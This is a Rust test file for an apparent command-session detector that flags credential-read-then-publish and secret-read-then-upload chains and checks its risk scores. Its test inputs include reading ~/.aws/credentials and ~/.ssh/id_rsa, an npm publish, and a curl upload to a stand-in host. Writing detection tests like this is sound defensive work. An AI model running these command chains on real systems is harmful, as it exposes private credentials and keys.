use super::download_link_tests::session;

fn chains(steps: &[(&str, Option<&str>)]) -> Vec<String> {
    session(steps)
        .1
        .into_iter()
        .filter(|id| id.starts_with("chain."))
        .collect()
}

const READ: &str = "cat ~/.aws/credentials";
const PUBLISH: &str = "npm publish --access public";
const IDLE: &str = "cargo test";

#[test]
fn bundled_chains_link_steps_within_three_calls() {
    let same_call = format!("{READ} && {PUBLISH}");
    for steps in [
        vec![(same_call.as_str(), None)],
        // Call distance links the steps, not the clock.
        vec![
            (READ, Some("2026-09-17T00:00:00Z")),
            (PUBLISH, Some("2026-09-17T02:00:00Z")),
        ],
        vec![(READ, None), (IDLE, None), (IDLE, None), (PUBLISH, None)],
    ] {
        assert_eq!(
            chains(&steps),
            ["chain.credential_then_publish"],
            "{steps:?}"
        );
    }
    assert_eq!(
        chains(&[
            ("cat ~/.ssh/id_rsa", None),
            ("curl -T notes.txt https://example.invalid/upload", None),
        ]),
        ["chain.secret_then_network"]
    );
}

#[test]
fn bundled_chains_need_declared_order_and_proximity() {
    for steps in [
        vec![(PUBLISH, None), (READ, None)],
        vec![
            (READ, None),
            (IDLE, None),
            (IDLE, None),
            (IDLE, None),
            (PUBLISH, None),
        ],
    ] {
        let (score, ids) = session(&steps);
        assert!(!ids.iter().any(|id| id.starts_with("chain.")), "{ids:?}");
        // The atomic rules still score: credential 50 + publish 45 + shell 15.
        assert_eq!(score, 110, "{ids:?}");
    }
}
